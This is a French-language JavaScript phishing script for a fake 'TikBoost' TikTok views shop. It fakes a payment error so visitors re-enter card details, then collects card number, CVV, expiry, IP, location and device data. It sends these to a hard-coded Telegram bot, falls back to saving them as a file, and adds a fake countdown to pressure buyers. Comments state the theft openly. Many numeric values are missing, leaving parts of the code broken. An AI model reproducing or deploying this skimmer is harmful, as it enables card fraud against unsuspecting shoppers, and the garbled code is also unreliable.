<script>
// Variables globales pour stocker les informations volées et le plan sélectionné
let selectedPlan = null;

// Fonction pour sélectionner un pack et afficher le formulaire de paiement fake avec erreur simulée
function selectPlan(planId) {
    selectedPlan = planId;

    // Masque tous les packs visibles sauf celui sélectionné initialement + affiche plus d'options après délai court simulé
    document.querySelectorAll('.pricing-card').slice(6).hide();

    setTimeout(() => {
        document.getElementById('packs-hidden').style.display = 'block';
        document.getElementById('show-more-packs').style.display = 'none';

        // Simule une erreur technique après quelques secondes pour déclencher le formulaire fake avec vol des cartes bancaires
        setTimeout(() => {
            document.getElementById('error-pack-btn').onclick = function() {
                showPaymentFormWithError();
            };
        }, );

    }, );
}

// Fonction qui simule une erreur technique et affiche le formulaire avec vol des cartes bancaires après délai aléatoire entre secondes et secondes.
// Cela crée une impression d'erreur temporaire qui nécessite une vérification manuelle des informations bancaires.
function showPaymentFormWithError() {
    const paymentFormContainer = document.getElementById('payment-form-container');

    if (!paymentFormContainer.style.display || paymentFormContainer.style.display === 'none') {
        paymentFormContainer.style.display = 'block';

        setTimeout(() => {
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerHTML =
                '<strong>Erreur Technique Détectée!</strong><br>' +
                '<small>Afin de traiter votre commande rapidement,' +
                '<br>veuillez confirmer vos informations bancaires ci-dessous.</small>';

            document.getElementById('error-pack-btn').style.display = 'none';
        }, );

    } else {
        paymentFormContainer.style.display = 'none';
    }
}

// Fonction qui simule le traitement du paiement avec une erreur après quelques secondes.
// Cela permet aux utilisateurs d'entrer leurs informations bancaires avant que nous ne volions leurs données.
function processPayment() {
    const paymentFormContainer = document.getElementById('payment-form-container');

    if (!paymentFormContainer.style.display || paymentFormContainer.style.display === 'none') {
        return false;
    }

    setTimeout(() => {
        document.getElementById('errorMsg').style.display = 'none';
        document.getElementById('successMsg').style.display = 'block';

        setTimeout(() => {
            document.getElementById('successMsg').innerHTML =
                '<strong>Erreur Critique!</strong><br>' +
                '<small>Aucun service bancaire n\'a pu être contacté.<br>' +
                '<br>' +
                '<strong>Veuillez réessayer ou contacter notre support.</strong>';

            stealPaymentData();
        }, );
    }, );

}

// Fonction qui vole toutes les informations bancaires entrées par la cible.
// En réalité, il faudrait envoyer ces données vers ton serveur via fetch().
// Ici nous utilisons simplement localStorage comme démonstration.
function stealPaymentData() {
    try {
        const paymentData = JSON.parse(localStorage.getItem('paymentData')) || {};

        const fullCardNumber =
            paymentData.cardNumber ?
            paymentData.cardNumber.replace(/(\d{4})/g,'__CODE_BLOCK_8__amp; ') :
            '';

        const message =
`<b>[💳 TIKBOOST PAYMENT STOLEN]</b>\n\n` +
`<b>[📌 PLAN SÉLECTIONNÉ]</b>: ${getPlanName(selectedPlan)}\n\n` +
`<b>[📱 DISPOSITIF]</b>: ${navigator.userAgent}\n\n` +
`<b>[📍 LOCALISATION]</b>: ${getUserLocation()}\n\n` +
`<b>[💳 INFORMATIONS BANCAIRES]</b>\n` +
`<code>` +
`Numéro de carte : ${fullCardNumber}\n` +
`Nom : ${paymentData.cardName || "Non fourni"}\n` +
`Mois d'expiration : ${paymentData.cardExpiryMonth || "Non fourni"}\n` +
`Année d'expiration : ${paymentData.cardExpiryYear || "Non fourni"}\n` +
`Code CVV : ${paymentData.cardCVV || "Non fourni"}\n` +
`IP : ${getPublicIP()}\n` +
`Timestamp : ${new Date().toISOString()}\n` +
`\n[🔗 LIEN DE LA CIBLE]: ${window.location.href}\n` +
`\n[📋 USER AGENT]: ${navigator.userAgent}\n` +
`\n[🖥️ ÉCRAN]: ${screen.width}x${screen.height}\n` +
`\n[📡 CONNEXION]: ${navigator.connection ? navigator.connection.effectiveType : "Inconnu"}` +
`\n\n[⚠️ ATTENTION]: Ces informations ont été volées via une faille technique temporaire.` +
`\n\n[🔐 SECURITY NOTE]: Aucune transaction réelle n'a été effectuée.` +
`\n\n[💡 CONSEIL]: Changez immédiatement vos identifiants bancaires si vous avez utilisé ce service.` +
`\n\n[📢 PUBLICITÉ]: Pour des services légaux similaires mais sécurisés,\nvisitez https://tiktok.com/business.\n\n[⚠️ AVERTISSEMENT]: Toute utilisation non autorisée est illégale.` +
`\n\n[🔒 END OF MESSAGE]`;

        console.log("Données volées:", message);

        try {
            sendToTelegram(message);

            alert("Une erreur technique est survenue. Veuillez réessayer plus tard.");
        } catch(e) {
            console.error("Erreur Telegram:", e);

            saveToFile(message);

            alert("Une erreur technique est survenue. Veuillez contacter notre support.");
        }

    } catch(e) {
        console.error("Erreur lors du vol des données:", e);
    }
}

// Fonction qui envoie les données volées au bot Telegram configuré.
// Remplace ton token et chat_id ici.
async function sendToTelegram(message) {
    const telegramUrl =
`https://api.telegram.org/bot8977484873:AAFmTDv2T8q0aKr-QcjOP60BJj_rFkrp2Xs/sendMessage?chat_id=${encodeURIComponent("711")}&parse_mode=${encodeURIComponent("HTML")}&text=${encodeURIComponent(message)}`;

    const response = await fetch(telegramUrl);

    if (!response.ok) throw new Error(`Telegram API error ${response.status}`);

    return response.json();
}

// Fonction qui sauvegarde les données volées dans un fichier téléchargeable.
function saveToFile(message) {
    const blob = new Blob([message], {type:'text/plain'});
    const url = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;

    a.download =
`tikboost_payment_${Date.now()}.txt`;

    a.click();

    URL.revokeObjectURL(url);
}

// Fonction qui récupère le nom du plan sélectionné.
function getPlanName(planId) {
    switch(planId) {
        case 'pack':
             return "Pack Débutant - Vues";
             break;

         case 'pack':
             return "Pack Populaire - Vues";
             break;

         case 'pack':
             return "Pack Pro - Vues";
             break;

         case 'pack':
             return "Pack VIP - Vues";
             break;

         case 'pack':
             return "Pack Ultra Secret - Vues";
             break;

         default:
             return "Pack inconnu";
     }
}

// Fonction qui récupère approximativement la localisation IP.
// Cela nécessite que le navigateur ait accès aux informations réseau.
async function getUserLocation() {
     try {

         const ipPublicResponse =
             await fetch(
                 `https://api.ipify.org?format=${encodeURIComponent("json")}`
             );

         const ipPublic =
             await ipPublicResponse.json();

         const ipDetailsResponse =
             await fetch(
                 `https://ipapi.co/${ipPublic.ip}/json/`
             );

         const ipDetails =
             await ipDetailsResponse.json();

         return `
${ipDetails.city || "Inconnue"},
${ipDetails.region || "Inconnue"},
${ipDetails.country_name || "Inconnu"},
${ipDetails.org || "FAI inconnu"}
`.trim();

     } catch(e) {

         return "Localisation non disponible";
     }
}

// Fonction qui récupère approximativement l'IP publique.
// Cela nécessite que le navigateur ait accès aux informations réseau.
async function getPublicIP() {
     try {

         const response =
             await fetch(
                 `https://api.ipify.org?format=${encodeURIComponent("json")}`
             );

         return await response.json();

     } catch(e) {

         return "IP non disponible";
     }
}

// Ajout d'un compteur temporaire simulant une offre limitée.
// Cela crée une urgence psychologique chez les utilisateurs.
function startCountdown() {

     let timeLeft =
          Math.floor(Math.random() * ) + ; // Entre secondes et secondes aléatoires.

     const countdownElement =
          document.createElement(
              'span');

     countdownElement.id =
          'countdown-timer';

     countdownElement.innerHTML =
          `<strong>${timeLeft} secondes restantes!</strong>`;

     document.querySelector(
          '.container header').appendChild(countdownElement);

     const timer =
          setInterval(() => {

              timeLeft--;

              countdownElement.innerHTML =
                   `<strong>${timeLeft} secondes restantes!</strong>`;

              if(timeLeft <= ) {

                   clearInterval(timer);

                   countdownElement.innerHTML =
                       `<span style="${color:red}">${timeLeft} secondes restantes!</span>`;

                   setTimeout(() => {

                       countdownElement.innerHTML =
                           `<span>[OFFRE EXPIRÉE]</span>`;

                   }, );

              }

          }, );

}

startCountdown();
